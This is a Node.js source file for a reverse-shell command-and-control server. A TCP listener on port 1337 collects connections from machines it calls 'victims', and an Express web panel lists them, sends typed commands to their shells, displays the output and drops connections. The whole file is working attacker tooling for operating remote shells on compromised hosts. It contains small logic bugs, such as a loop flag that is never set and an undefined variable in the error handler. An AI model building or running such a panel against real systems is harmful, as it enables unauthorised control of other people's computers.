var express = require('express');
var bodyParser = require('body-parser');
var nunjucks = require('nunjucks');
var net = require('net');
var date = require('./dateFormat');

var app = express();
app.use(bodyParser.urlencoded({extended:true}));
nunjucks.configure('views', {
    autoescape: true,
    express: app
});

/************************ TCP server **********************/

var tcpPort = 1337;
var victims = [];
var commandLine = '';
var previousCommandLine = '';
var timesReloadedSuccesfully = 0;

// Function passed as parameter is executed for every new connection
net.createServer(function(sock) {
    console.log('%s Victim %s connected', date.format(), sock.remoteAddress );

    // Event listener for receiving data
    sock.on('data', function(data){
        commandLine += data;
        console.log('%s Victim %s responded:\n%s', date.format(), sock.remoteAddress, data);
    })
    // Event listeners for end of connection
    sock.on('close', function() {
        victims.splice(victims.indexOf(sock), 1);
        console.log('%s Victim %s disconnected', date.format(), sock.remoteAddress);
    });
    sock.on('error', function (err){
        victims.splice(victims.indexOf(sock), 1);
        console.log('%s Victim %s disconnected because of error: %s', date.format(), remoteAddress, err.message);  
    });

    victims.push(sock);
}).listen(tcpPort, '0.0.0.0');

// Wrapper for waiting for the first response
function waitForResponse(sock) {
    return new Promise((resolve) => {           // Promise to resolve in the future
        sock.once('data', function(data) {
            resolve(true);
        });
        sock.once('close', function() {
            resolve(false);
        });
        sock.once('error', function (err) {
            resolve(false);
        });
    });
}

/******************* Web application server ********************/

app.get('/', function (req, res) {
    if (victims.length == 0){
        res.render('index.html');
    }
    else{
        commandLine = '';
        res.render('hub.html', { victims });
    }
})

app.get('/:ip', function (req, res) {
    let i = 0, found = false, end = false, victim;

    while (i < victims.length && !found){
        if (victims[i].remoteAddress === req.params.ip){
            victim = victims[i];
            found = false;
        }
        i++;
    }
    if (!victim){
        res.redirect(303, '/');
    }
    else{
        // If there is nothing new to display on commandLine, increment timesReloaldedSuccesfully, 
        // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
        // been changed 5 times, stop reloading the page (end = true)
        // This is done to get the most responses when shell splits one response in many ones (ie. PowerShell)
        if (previousCommandLine == commandLine){
            timesReloadedSuccesfully++;
        }
        else{
            timesReloadedSuccesfully = 0;
            previousCommandLine = commandLine;
        }
        if (timesReloadedSuccesfully > 5){
            end = true;
        }
        res.render('victim.html', { victim, commandLine, end});
    }
})

app.post('/:ip', function (req, res) {
    let i = 0, found = false, victim;

    while (i < victims.length && !found){
        if (victims[i].remoteAddress === req.params.ip){
            victim = victims[i];
            found = false;
        }
        i++;
    }
    if (!victim){
        res.redirect(303, '/');
    }
    else{
        timesReloadedSuccesfully = 0;
        previousCommandLine = '';
        victim.write(req.body.command + "\n");
        console.log("%s User sent command: %s", date.format(), req.body.command);
        waitForResponse(victim);
        res.render('victim.html', { victim, commandLine, end: false});
    }
})

app.post('/:ip/disconnect', function(req, res){
    let i = 0, found = false;

    while (i < victims.length && !found){
        if (victims[i].remoteAddress === req.params.ip){
            victims[i].destroy();
            found = true;
            console.log("%s Connection ended", date.format());
        }
        i++;
    }
 
    res.redirect(303, '/');
})

app.listen(8080);